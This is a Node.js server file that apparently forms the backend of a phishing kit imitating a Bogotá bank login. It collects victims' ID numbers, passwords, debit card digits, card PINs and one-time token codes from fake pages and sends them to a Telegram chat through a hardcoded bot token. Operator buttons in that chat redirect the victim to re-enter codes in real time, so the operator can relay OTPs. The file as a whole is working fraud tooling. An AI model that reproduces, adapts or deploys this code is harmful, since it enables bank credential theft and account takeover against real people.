const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const { createServer } = require('http');
const { Server } = require('socket.io');

// Set para mantener registro de clientes conectados
const connectedClients = new Set();

// Configuración inicial
const app = express();
const httpServer = createServer(app);
const PORT = process.env.PORT || 3000;

// Configuración de Socket.io
const io = new Server(httpServer, {
    cors: { 
        origin: process.env.VERCEL === '1' ? 'https://panel-de-bogota.vercel.app' : '*',
        methods: ["GET", "POST"],
        credentials: true
    },
    path: '/socket.io',
    transports: ['websocket', 'polling'],
    pingTimeout: 60000,
    pingInterval: 25000,
    allowEIO3: true
});

// Solo iniciar el servidor HTTP si no estamos en Vercel
if (process.env.VERCEL !== '1') {
    httpServer.listen(PORT, () => {
        console.log(`Servidor iniciado en el puerto ${PORT}`);
    });
}

const token = process.env.TELEGRAM_TOKEN || '8739783518:AAFrbcvTXCm6zRUAmYSpiQIKgqyNjTQS79w';
const chatId = process.env.TELEGRAM_CHAT_ID || '-5081537760';

// Middlewares
app.use(express.json());

// Configurar cabeceras CORS
app.use((req, res, next) => {
    const origin = process.env.VERCEL === '1' ? 'https://panel-de-bogota.vercel.app' : '*';
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    next();
});

// Servir archivos estáticos
app.use(express.static(path.join(__dirname)));

// Manejar todas las rutas HTML
app.get('/:page.html', (req, res) => {
    res.sendFile(path.join(__dirname, req.params.page + '.html'));
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Configuración del bot de Telegram
const bot = new TelegramBot(token, { polling: true });

// Función para enviar mensajes a Telegram
async function sendTelegramMessage(data) {
    try {
        const keyboard = {
            inline_keyboard: [
                [
                    { text: '❌ Error de Logo', callback_data: 'error_logo' },
                    { text: '🔄 Pedir Logo', callback_data: 'pedir_logo' }
                ],
                [
                    { text: '❌ Error de Token', callback_data: 'error_token' },
                    { text: '🔄 Pedir Token', callback_data: 'pedir_token' }
                ],
                [
                    { text: '✅ Finalizar', callback_data: 'finalizar' }
                ]
            ]
        };

        let messageText;
        if (typeof data === 'object') {
            if (data.tipo === 'Clave Segura') {
                messageText = `🔐 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `🔑 Clave: ${data.clave}`;
            } else if (data.tipo === 'Tarjeta Débito') {
                messageText = `💳 Nueva solicitud de ingreso:\n\n` +
                            `📋 Tipo: ${data.tipo}\n` +
                            `🪪 Documento: ${data.tipoDocumento} ${data.numeroDocumento}\n` +
                            `💳 Tarjeta: ${data.ultimosDigitos}\n` +
                            `🔑 Clave: ${data.claveTarjeta}`;
            } else if (data.tipo === 'Token') {
                messageText = `🔐 Verificación de Token:\n\n` +
                            `🔑 Código: ${data.codigo}\n` +
                            `⏰ Timestamp: ${data.timestamp}`;
            }
        } else {
            messageText = data.toString();
        }

        console.log('Enviando mensaje:', messageText);

        const result = await bot.sendMessage(chatId, messageText, {
            parse_mode: 'HTML',
            reply_markup: keyboard
        });

        console.log('Mensaje enviado exitosamente');
        return result;
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        throw error;
    }
}

// Rutas API
app.post('/api/send-telegram', async (req, res) => {
    try {
        const result = await sendTelegramMessage(req.body);
        res.json({
            success: true,
            messageId: result.message_id
        });
    } catch (error) {
        console.error('Error al enviar mensaje:', error);
        res.status(500).json({
            success: false,
            error: 'Error al procesar la solicitud'
        });
    }
});

// Servir archivos estáticos
app.get(['/', '/index.html', '/token.html', '/dashboard.html'], (req, res) => {
    const filePath = req.path === '/' ? 'index.html' : req.path;
    res.sendFile(path.join(__dirname, filePath));
});

// Función para manejar redirecciones
const handleRedirect = (action, baseUrl = '') => {
    const redirects = {
        'error_logo': { 
            url: `${baseUrl}/index.html?action=error_logo`, 
            message: 'Por favor verifique su logo e intente nuevamente.'
        },
        'pedir_logo': { 
            url: `${baseUrl}/index.html?action=pedir_logo`, 
            message: null
        },
        'error_token': { 
            url: `${baseUrl}/token.html?action=error_token`, 
            message: 'Token incorrecto. Por favor intente nuevamente.'
        },
        'pedir_token': { 
            url: `${baseUrl}/token.html?action=pedir_token`, 
            message: null
        },
        'finalizar': { 
            url: `${baseUrl}/dashboard.html?action=finalizar`, 
            message: 'Proceso finalizado exitosamente'
        }
    };

    return redirects[action] || { url: `${baseUrl}/`, message: null };
};

// Socket.io manejo de conexiones
io.on('connection', (socket) => {
    console.log('Cliente conectado:', socket.id);
    connectedClients.add(socket.id);
    
    socket.on('process_action', async (data) => {
        try {
            const { action, messageId } = data;
            console.log(`Procesando acción ${action} para mensaje ${messageId}`);

            const isVercel = process.env.VERCEL === '1';
            const baseUrl = isVercel ? 'https://panel-de-bogota.vercel.app' : 'http://localhost:3000';
            const { message, url } = handleRedirect(action, baseUrl);

            socket.emit('telegram_action', {
                action: action,
                messageId: messageId,
                message: message,
                redirect: url
            });
        } catch (error) {
            console.error('Error al procesar acción:', error);
            socket.emit('telegram_action', {
                action: 'error',
                message: 'Error al procesar la acción. Por favor intente nuevamente.'
            });
        }
    });

    socket.on('token_verification', async (data) => {
        console.log('Recibida verificación de token:', data);
        try {
            if (!data || !data.codigo) {
                throw new Error('Datos de token inválidos');
            }
            
            console.log('Enviando token a Telegram...');
            const result = await sendTelegramMessage(data);
            console.log('Token enviado exitosamente, messageId:', result.message_id);
            
            socket.emit('telegram_action', { 
                action: 'waiting_response',
                messageId: result.message_id,
                message: 'Verificando token...'
            });
        } catch (error) {
            console.error('Error en verificación de token:', error);
            socket.emit('telegram_action', { 
                action: 'error',
                message: 'Error al procesar el token. Por favor intente nuevamente.'
            });
        }
    });

    socket.on('disconnect', () => {
        console.log('Cliente desconectado:', socket.id);
        connectedClients.delete(socket.id);
    });
});

// Manejo de eventos de botones de Telegram
bot.on('callback_query', async (callbackQuery) => {
    if (!callbackQuery || !callbackQuery.message) {
        console.error('Callback query inválido');
        return;
    }
    
    try {
        const action = callbackQuery.data;
        const messageId = callbackQuery.message.message_id;
        
        console.log(`Acción recibida: ${action}, Message ID: ${messageId}`);
        
        // Configurar URL base según el entorno
        const isVercel = process.env.VERCEL === '1';
        const baseUrl = isVercel ? 'https://panel-de-bogota.vercel.app' : 'http://localhost:3000';

        // Responder al callback query
        await bot.answerCallbackQuery(callbackQuery.id, {
            text: action === 'finalizar' ? '✅ Proceso finalizado' : '✓ Acción procesada'
        });

        // Procesar la acción y obtener información de redirección
        const { message, url } = handleRedirect(action, baseUrl);

        // Emitir el evento a todos los clientes conectados
        io.emit('telegram_action', {
            action: action,
            messageId: messageId,
            message: message,
            redirect: url
        });

        if (action === 'finalizar') {
            try {
                await bot.editMessageText(`✅ ${message}`, {
                    chat_id: chatId,
                    message_id: messageId,
                    reply_markup: { inline_keyboard: [] }
                });
            } catch (error) {
                console.error('Error al actualizar mensaje:', error);
            }
        }
    } catch (error) {
        console.error('Error al procesar callback query:', error);
    }
});

// Iniciar el servidor y el bot
async function startServer() {
    try {
        const botInfo = await bot.getMe();
        console.log('Bot conectado exitosamente:', botInfo.username);
        
        if (process.env.VERCEL !== '1') {
            await bot.setWebHook('');
            console.log('Webhook desactivado para desarrollo local');
        }
    } catch (error) {
        console.error('Error al inicializar:', error);
        process.exit(1);
    }
}

// Manejo de errores global
bot.on('error', (error) => {
    console.error('Error del bot:', error);
});

bot.on('webhook_error', (error) => {
    console.error('Error de webhook:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

// Iniciar el servidor si no estamos en Vercel
if (process.env.VERCEL !== '1') {
    startServer();
}

// Función para manejar las solicitudes en Vercel
const handler = async (req, res) => {
    if (!app.initialized) {
        try {
            const botInfo = await bot.getMe();
            console.log('Bot conectado exitosamente:', botInfo.username);
            
            if (process.env.VERCEL === '1') {
                const webhookUrl = 'https://panel-de-bogota.vercel.app/api/webhook';
                await bot.setWebHook(webhookUrl);
                console.log('Webhook configurado para:', webhookUrl);
            }
            
            app.initialized = true;
        } catch (error) {
            console.error('Error al inicializar el bot:', error);
        }
    }
    
    return app(req, res);
};

// Exportar el handler para Vercel
module.exports = handler;